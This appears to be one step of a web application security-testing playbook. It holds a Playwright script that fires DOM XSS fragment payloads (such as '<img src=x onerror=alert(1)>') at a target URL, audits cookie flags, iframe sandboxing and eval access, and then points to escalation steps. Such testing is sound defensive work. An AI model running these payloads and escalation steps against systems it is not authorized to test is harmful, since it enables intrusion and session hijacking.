# Modern Browser — Verify

## Purpose
DOM XSS verification via URL fragments and injected payloads, CSP bypass testing via `page.on('console')` violation capture, cookie flag inspection (HttpOnly, Secure, SameSite), iframe sandbox bypass, and eval access check.

## Required Variables
- $TARGET_URL: target web application URL
- $OUTDIR: output directory
- $EVIDENCE_DIR: evidence directory

## Commands

### 03.1 — DOM XSS fragments, CSP violation capture, cookie inspection
```bash
mkdir -p $OUTDIR/verify $EVIDENCE_DIR

python3 << 'PYEOF'
import asyncio, json, os
from datetime import datetime, timezone
from playwright.async_api import async_playwright

TARGET = os.environ["TARGET_URL"]
OUTDIR = os.environ["OUTDIR"]
EVDIR  = os.environ["EVIDENCE_DIR"]

DOM_XSS_FRAGMENTS = [
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    "#javascript:alert(1)",
    "#\" onfocus=alert(1) autofocus ",
    "#'+alert(1)+'",
    "#`${alert(1)}`",
]

async def run():
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    dialog_events = []
    csp_violations = []
    console_entries = []

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        page.on("dialog", lambda d: dialog_events.append({"type": d.type, "message": d.message}) or asyncio.ensure_future(d.dismiss()))

        page.on("console", lambda msg: console_entries.append({"type": msg.type, "text": msg.text}))

        await page.goto(TARGET, wait_until="networkidle", timeout=30000)

        csp_header = dict(await page.evaluate("""() => {
            const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            return {meta_csp: meta ? meta.content : null};
        }"""))

        xss_results = []
        for fragment in DOM_XSS_FRAGMENTS:
            try:
                await page.goto(TARGET + fragment, wait_until="load", timeout=10000)
                await asyncio.sleep(1.5)
                fired = any(fragment.replace("#","").strip()[:20] in (d.get("message","") or "") for d in dialog_events)
                xss_results.append({"fragment": fragment, "dialog_triggered": len(dialog_events) > 0, "message": dialog_events[-1]["message"] if dialog_events else None})
            except Exception as ex:
                xss_results.append({"fragment": fragment, "error": str(ex)[:100]})

        cookies = await context.cookies()
        cookie_report = []
        for c in cookies:
            cookie_report.append({"name": c["name"], "domain": c["domain"],
                "httpOnly": c.get("httpOnly", False), "secure": c.get("secure", False),
                "sameSite": c.get("sameSite", "Unspecified"), "value_len": len(c.get("value",""))})
        weak_cookies = [c for c in cookie_report if not c["httpOnly"] or not c["secure"] or c["sameSite"] in ("Unspecified","None","Lax")]

        iframe_sandbox = await page.evaluate("""() => {
            const iframes = document.querySelectorAll('iframe');
            return [...iframes].map(f => ({src: f.src, sandbox: f.getAttribute('sandbox'), allow: f.getAttribute('allow')}));
        }""")

        eval_ok = await page.evaluate("() => { try { return eval('1+1'); } catch(e) { return 'BLOCKED: '+e.message; } }")

        report = {
            "url": TARGET, "timestamp": ts,
            "xss_fragments_tested": len(DOM_XSS_FRAGMENTS), "xss_results": xss_results,
            "dialog_events_total": len(dialog_events), "dialog_events": dialog_events,
            "csp_meta": csp_header,
            "console_entry_count": len(console_entries), "console_entries": console_entries[:50],
            "cookie_count": len(cookies), "weak_cookies": weak_cookies, "all_cookies": cookie_report,
            "iframe_sandbox": iframe_sandbox,
            "eval_access": eval_ok,
        }
        with open(f"{OUTDIR}/verify/verify_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        await browser.close()

asyncio.run(run())
PYEOF
```

## Detection Signals
- `dialog_events_total > 0` → DOM XSS confirmed (dialog alert fired)
- `weak_cookies[*].sameSite == "None"` without `Secure` → rejected by browser, CSRF risk
- `weak_cookies[*].httpOnly == false` → cookie accessible via `document.cookie`, XSS risk
- `eval_access` returns a number → eval() not blocked by CSP
- `iframe_sandbox[*].sandbox == null` or empty → no iframe sandboxing, clickjacking surface
- `console_entries` contain CSP violation lines → CSP misconfigurations found

## Next
├── If DOM XSS confirmed → collect evidence with `05-evidence-collection.md`, escalate to `04-impact-escalation.md`
├── If weak cookies found → escalate session hijack impact via `04-impact-escalation.md`
├── If eval unblocked + no CSP → test stored/reflected XSS injection paths
├── If no findings → run `06-false-positive-filter.md` to distinguish SPA hydration artifacts